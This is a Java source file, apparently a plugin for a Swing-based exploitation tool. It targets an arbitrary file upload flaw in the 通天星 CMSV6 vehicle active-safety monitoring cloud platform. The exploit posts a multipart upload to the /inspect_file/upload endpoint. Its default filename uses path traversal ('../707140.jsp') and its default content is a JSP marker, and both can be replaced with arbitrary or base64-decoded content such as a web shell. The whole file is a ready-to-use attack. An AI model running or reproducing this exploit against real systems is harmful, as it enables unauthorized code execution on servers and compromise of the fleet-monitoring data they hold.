package org.jiu.templates.impl;

import cn.hutool.core.codec.Base64;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;
import me.gv7.woodpecker.requests.body.Part;
import org.jiu.templates.TabContent;
import org.jiu.form.UploadFileForm;
import org.jiu.utils.Utils;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.util.HashMap;

public class UploadTemplate extends JPanel implements TabContent {
    private JTabbedPane tabbedPane;
    private UploadFileForm uploadFileForm;
    private String url;
    public String filename;
    public String fileContent;
    private HashMap<String, String> headers = new HashMap<>();

    // 修改下面参数
    public String name = "通天星inspect_file接口任意文件上传"; // 漏洞名
    public String product = "通天星";             // 类型
    public String desc = "通天星CMSV6车载主动安全监控云平台inspect_file接口处存在任意文件上传";  // 描述
    public String author = "xm17";              // 作者
    public String className = "org.jiu.templates.exploit.impl.UploadTemplate"; // 类名(必须)
    public String tabName = "通天星inspect_file接口任意文件上传";  // tab显示名称
    public String tips = "通天星CMSV6车载主动安全监控云平台inspect_file接口处存在任意文件上传";    // 提示



    public UploadTemplate() {
    }

    public UploadTemplate(JTabbedPane tabbedPane) {
        this.tabbedPane = tabbedPane;
    }

    @Override
    public void init() {
        uploadFileForm = new UploadFileForm();
    }

    @Override
    public JPanel getPanel() {
        return uploadFileForm.UploadFileForm;
    }

    @Override
    public String getTabName() {
        return tabName;
    }

    public void setTabbedPane(JTabbedPane tabbedPane) {
        this.tabbedPane = tabbedPane;
    }

    @Override
    public void exploit() {
        // 提示一下怎么用
        uploadFileForm.tipsLabel.setText(tips);

        // 最好显式输出文件名
        String filenameTemp = "../707140.jsp";
        uploadFileForm.filenameField.setText(filenameTemp);

        // 最好显式输出上传内容
        String fileContentTemp = "<% out.println(\"007319607\"); %>";
        uploadFileForm.filecontentArea.setText(fileContentTemp);

        // Use an array to hold the SwingWorker reference
        final SwingWorker[] worker = new SwingWorker[1];

        uploadFileForm.startButton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // Create and execute the background task
                worker[0] = new SwingWorker<String, Void>() {
                    @Override
                    protected String doInBackground() throws Exception {
                        url = Utils.removeTrailingSlash(uploadFileForm.urlField.getText());
                        filename = uploadFileForm.filenameField.getText();
                        fileContent = uploadFileForm.filecontentArea.getText();

                        if (uploadFileForm.isbase64Box.isSelected()){
                            fileContent = Base64.decodeStr(fileContent);
                        }

                        headers = Utils.getHeaders(uploadFileForm.headerArea.getText());

                        // 处理上传内容
                        Part<byte[]> uploadFile = Part.file("uploadFile", filename, fileContent.getBytes());
                        StringBuilder resultOutPrint = new StringBuilder();

                        try {
                            // 接下来写实现发包逻辑
                            RawResponse rawResponse = Requests.post(url + "/inspect_file/upload")
                                    .verify(false)
                                    .headers(headers)
                                    .multiPartBody(uploadFile)
                                    .send();
                            resultOutPrint.append(rawResponse.readToText()).append("\n\n==========================\n\n");
                        } catch (Exception ex) {
                            return "失败: " + ex.getMessage();
                        }

                        return resultOutPrint.toString();
                    }

                    @Override
                    protected void done() {
                        try {
                            String result = get(); // 获取结果
                            uploadFileForm.resultArea.setText(result);
                        } catch (Exception ex) {
                            uploadFileForm.resultArea.setText("出现错误: " + ex.getMessage());
                        }
                    }
                };

                worker[0].execute(); // 执行任务
            }
        });

        // 添加停止按钮的逻辑
        uploadFileForm.stopButton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // 停止上传的逻辑
                if (worker[0] != null) {
                    worker[0].cancel(true); // 取消上传操作
                    uploadFileForm.resultArea.setText("已被停止。");
                }
            }
        });
    }
}
